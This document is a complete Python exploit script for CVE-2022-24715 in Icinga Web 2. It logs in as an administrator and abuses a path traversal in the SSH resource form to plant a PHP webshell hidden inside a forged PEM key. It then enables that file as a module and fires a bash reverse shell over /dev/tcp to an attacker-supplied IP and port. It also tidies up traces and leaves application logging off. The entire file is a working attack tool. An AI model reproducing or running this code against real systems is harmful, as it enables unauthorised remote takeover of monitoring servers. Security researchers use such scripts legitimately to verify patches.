#!/usr/bin/env python3

# Exploit Title: Icinga Web 2 - Authenticated Remote Code Execution <2.8.6, <2.9.6, <2.10
# Date: 2023-03-20
# Exploit Author: Jacob Ebben
# Vendor Homepage: https://icinga.com/
# Software Link: https://github.com/Icinga/icingaweb2
# Version: <2.8.6, <2.9.6, <2.10
# Tested on: Icinga Web 2 Version 2.9.2 on Linux
# CVE: CVE-2022-24715
# Based on: https://www.sonarsource.com/blog/path-traversal-vulnerabilities-in-icinga-web/

import argparse
import requests
import re
import random
import string
import threading
from os import path
from termcolor import colored

def print_message(message, type):
    if type == 'SUCCESS':
        print('[' + colored('SUCCESS', 'green') +  '] ' + message)
    elif type == 'INFO':
        print('[' + colored('INFO', 'blue') +  '] ' + message)
    elif type == 'WARNING':
        print('[' + colored('WARNING', 'yellow') +  '] ' + message)
    elif type == 'ALERT':
        print('[' + colored('ALERT', 'yellow') +  '] ' + message)
    elif type == 'ERROR':
        print('[' + colored('ERROR', 'red') +  '] ' + message)

def get_normalized_url(url):
    if url[-1] != '/':
        url += '/'
    if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
        url = "http://" + url
    return url

def get_proxy_protocol(url):
    if url[0:8].lower() == 'https://':
       return 'https'
    return 'http'

def get_random_string(length):
   chars = string.ascii_letters + string.digits
   return ''.join(random.choice(chars) for i in range(length))

def check_connectivity(session, base_url):
    url = base_url + "authentication/login"
    result = session.get(url, proxies=proxies)
    return result.status_code == 200
    
def get_csrf(session, url):
    result = session.get(url, proxies=proxies)
    csrf_regex = r'name="CSRFToken" value="([^"]*)"'
    csrf_regex_result = re.search(csrf_regex, result.text)
    if csrf_regex_result is not None:
        return csrf_regex_result.group(1)
    else:
        print_message("Could not retrieve a CSRF token from: {url}".format(url=url), "ERROR")
        print_message("Are you sure the specified target is an Icinga Web 2 instance?", "INFO")
        print_message("It is possible that the Icinga Web 2 version is not supported by this script...", "INFO")
        exit()

def login(session, base_url, username, password):
    url = base_url + "authentication/login"
    csrf_token = get_csrf(session, url)
    data = {
        "username": username, 
        "password": password,
        "CSRFToken": csrf_token,
        "formUID": "form_login",
        "btn_submit": "Login"
    }
    result = session.post(url, data=data, proxies=proxies, allow_redirects=False)
    return result.status_code

def read_pem(pem):
    with open(pem, "r") as pem_file: return pem_file.read()

def forge_payload_pem(valid_pem, webshell):
    return valid_pem + '\x00' + webshell

def upload_payload(session, base_url, payload_name, payload):
    url = base_url + "config/createresource"
    csrf_token = get_csrf(session, url)
    data = {
        "type": "ssh",
        "name": payload_name,
        "user": "../../../../../../../../../../../dev/shm/run.php",
        "private_key": payload,
        "formUID": "form_config_resource",
        "CSRFToken": csrf_token,
        "btn_submit": "Save Changes"
    }
    result = session.post(url, data=data, proxies=proxies)
    return result.status_code

def update_application_config(session, base_url, settings):
    url = base_url + "config/general"
    csrf_token = get_csrf(session, url)
    data = {
        "global_show_stacktraces": settings["global_show_stacktraces"],
        "global_show_application_state_messages": settings["global_show_application_state_messages"],
        "global_module_path": settings["global_module_path"],
        "global_config_resource": settings["global_config_resource"],
        "logging_log": "none",
        "themes_default": "Icinga",
        "themes_disabled": settings["themes_disabled"],
        "authentication_default_domain": settings["authentication_default_domain"],
        "formUID": "form_config_general",
        "CSRFToken": csrf_token,
        "btn_submit": "Save Changes"
    }
    result = session.post(url, data=data, proxies=proxies)
    return result.status_code

def enable_module(session, base_url):
    url = base_url + "config/moduleenable"
    csrf_token = get_csrf(session, url)
    data = {
        "identifier": "shm",
        "CSRFToken": csrf_token,
        "btn_submit": "btn_submit"
    }
    result = session.post(url, data=data, proxies=proxies)
    return result.status_code

def disable_module(session, base_url):
    url = base_url + "config/moduledisable"
    csrf_token = get_csrf(session, url)
    data = {
        "identifier": "shm",
        "CSRFToken": csrf_token,
        "btn_submit": "btn_submit"
    }
    result = session.post(url, data=data, proxies=proxies)
    return result.status_code

def trigger_payload(session, base_url, command):
    url = base_url + "dashboard"
    data = {
        "cmd": command
    }
    result = session.post(url, data=data, proxies=proxies, timeout=2)
    return result.status_code

def check_successful_upload_payload(session, base_url):
    url = base_url + "lib/icinga/icinga-php-thirdparty/dev/shm/run.php"
    result = session.get(url, proxies=proxies)
    return result.status_code == 200

def remove_payload_resource(session, base_url, payload_name):
    url = base_url + "config/removeresource?resource=" + payload_name
    csrf_token = get_csrf(session, url)
    data = {
        "CSRFToken": csrf_token,
        "formUID": "form_confirm_removal",
        "btn_submit": "Confirm Removal"
    }
    result = session.post(url, data=data, proxies=proxies)
    return result.status_code

def remove_payload_file(session, base_url):
    command = "rm /dev/shm/run.php"
    trigger_payload(session, base_url, command)

def show_config_parsing_error():
    print_message("Unable to parse the current configuration for recovery after exploitation!", "ERROR")
    print_message("It is possible that this script was not tested on this version of Icinga Web 2", "INFO")
    exit()

def parse_config_stacktraces(config_page_content):
    stacktraces_regex = r"id=\"form_config_general_application_global_show_stacktraces-\w*\" value=\"1\" checked=\"checked\""
    stacktraces_regex_result = re.search(stacktraces_regex, config_page_content)
    if stacktraces_regex_result is None:
        return 0
    else:
        return 1

def parse_config_state_messages(config_page_content):
    state_messages_regex = r"id=\"form_config_general_application_global_show_application_state_messages-\w*\" value=\"1\" checked=\"checked\""
    state_messages_regex_result = re.search(state_messages_regex, config_page_content)
    if state_messages_regex_result is None:
        return 0
    else:
        return 1

def parse_config_themes_disabled(config_page_content):
    themes_disabled_regex = r"id=\"form_config_general_theming_themes_disabled-\w*\" value=\"1\" checked=\"checked\""
    result = re.search(themes_disabled_regex, config_page_content)
    if result is None:
        return 0
    else:
        return 1

def parse_config_module_path(config_page_content):
    module_path_regex = r'id="form_config_general_application_global_module_path-\w*" value="([^"]*)"'
    result = re.search(module_path_regex, config_page_content)
    if result is None:
        show_config_parsing_error()
    else:    
        return result.group(1)

def parse_config_default_domain(config_page_content):
    default_domain_regex = r'id="form_config_general_authentication_authentication_default_domain-\w*" value="([^"]*)"'
    result = re.search(default_domain_regex, config_page_content)
    if result is None:
        show_config_parsing_error()
    else:    
        return result.group(1)

def parse_config_config_resource(config_page_content):
    option_regex = r'<option value="([^"]*)" selected="selected">'
    option_regex_result = re.search(option_regex, config_page_content)
    return option_regex_result.group(1)

def get_config(session, base_url):
    url = base_url + "config/general"
    config_page_content = session.get(url, proxies=proxies).text
    settings = {
        "global_show_stacktraces": parse_config_stacktraces(config_page_content),
        "global_show_application_state_messages": parse_config_state_messages(config_page_content),
        "global_module_path": parse_config_module_path(config_page_content),
        "global_config_resource": parse_config_config_resource(config_page_content),
        "themes_disabled": parse_config_themes_disabled(config_page_content),
        "authentication_default_domain": parse_config_default_domain(config_page_content),
    }
    return settings


parser = argparse.ArgumentParser(description='Authenticated Remote Code Execution in Icinga Web <2.8.6, <2.9.6, <2.10')
parser.add_argument('-t', '--target', type=str, required=True,
                help='Target Icinga location (Example: http://localhost:8080/icinga2/ or https://victim.xyz/icinga/)')
parser.add_argument('-I', '--atk-ip', type=str, required=True,
                help='Address for reverse shell listener on attacking machine')
parser.add_argument('-P', '--atk-port', type=str, required=True,
                help='Port for reverse shell listener on attacking machine')
parser.add_argument('-u', '--username', type=str, required=True,
                help='Username of administrator user on Icinga Web 2')
parser.add_argument('-p','--password', type=str, required=True,
                help='Password of administrator user on Icinga Web 2')
parser.add_argument('-e','--pem', type=str, required=True,
                help='Location of file on attacking machine containing valid PEM (Generate with "ssh-keygen -m pem" without passphrase)')
parser.add_argument('-x','--proxy', type=str,
                help='HTTP proxy address (Example: http://127.0.0.1:8080/)')

args = parser.parse_args()

base_url = get_normalized_url(args.target)
webshell = '<?php system($_REQUEST["cmd"]);?>'
reverse_shell = "bash -c 'exec bash -i &>/dev/tcp/{ip}/{port} <&1'".format(ip=args.atk_ip,port=args.atk_port)
payload_module_name = get_random_string(16)

if args.proxy:
   proxy_url = get_normalized_url(args.proxy)
   proxy_protocol = get_proxy_protocol(proxy_url)
   proxies = { proxy_protocol: proxy_url }
else:
   proxies = {}

if not path.exists(args.pem):
    print_message("Could not find the specified PEM file!", "ERROR")
    exit()

s = requests.Session()

try:
    check_connectivity(s, base_url)
except requests.exceptions.RequestException as e:
    print_message("Could not connect to the Icinga Web 2 instance!", "ERROR")
    print(e)
    exit()

try:
    print_message("Attempting to login to the Icinga Web 2 instance...", "INFO")
    login_result = login(s, base_url, args.username, args.password)
    if login_result != 302:
        print_message("Unable to login with the provided options!", "ERROR")
        exit()
except requests.exceptions.RequestException as e:
    print_message("An error occurred while attempting to upload the malicious module!", "ERROR")
    print(e)
    exit()

try:
    valid_pem = read_pem(args.pem)
    payload = forge_payload_pem(valid_pem, webshell)
except requests.exceptions.RequestException as e:
    print_message("An error occurred while attempting to read the PEM file...", "ERROR")
    print(e)
    exit()

try:
    print_message("Attempting to upload our malicious module...", "INFO")
    upload_payload(s, base_url, payload_module_name, payload)
except requests.exceptions.RequestException as e:
    print_message("An error occurred while attempting to upload the malicious module!", "ERROR")
    print(e)
    exit()

if check_successful_upload_payload(s, base_url):
    print_message("The payload appears to be uploaded successfully!", "SUCCESS")
else:
    print_message("Could not verify if payload was uploaded successfully!", "WARNING")

try:
    old_settings = get_config(s, base_url)
    print_message("Modifying configurations...", "INFO")
    new_settings = dict(old_settings)
    new_settings["global_module_path"] = "/dev/"
    update_application_config(s, base_url, new_settings)
except requests.exceptions.RequestException as e:
    print_message("An error occurred while attempting to modify the configurations!", "ERROR")
    print(e)
    exit()

try:
    print_message("Attempting to enable the malicious module...", "INFO")
    enable_module(s, base_url)
except requests.exceptions.RequestException as e:
    print_message("An error occurred while attempting to enable the module!", "ERROR")
    print(e)
    exit()

try:
    print_message("Trying to trigger payload! Have a listener ready!", "INFO")
    command = reverse_shell
    trigger_payload(s, base_url, command)
except requests.exceptions.Timeout:
    print_message("It appears that a reverse shell was started!", "SUCCESS")
    pass
except requests.exceptions.RequestException as e:
    print(e)
    exit()
else:
    print_message("It appears that the reverse shell was not successful...", "WARNING")

try:
    print_message("Removing malicious module file...", "INFO")
    remove_payload_file(s, base_url)
    remove_payload_resource(s, base_url, payload_module_name)
    print_message("Disabling malicious module...", "INFO")
    disable_module(s, base_url)
    print_message("Resetting website configuration...", "INFO")
    update_application_config(s, base_url, old_settings)
except requests.exceptions.RequestException as e:
    print_message("An error occurred while cleaning up modified configurations!", "ERROR")
    print_message("Manual removal of the exploit remnants is highly recommended!", "ALERT")
    print(e)
    pass
else:
    print_message("Cleanup successful! Shutting down...", "SUCCESS")

print_message("In the process of exploitation, the application logging has been turned off. Log in manually to reset these settings!", "ALERT")
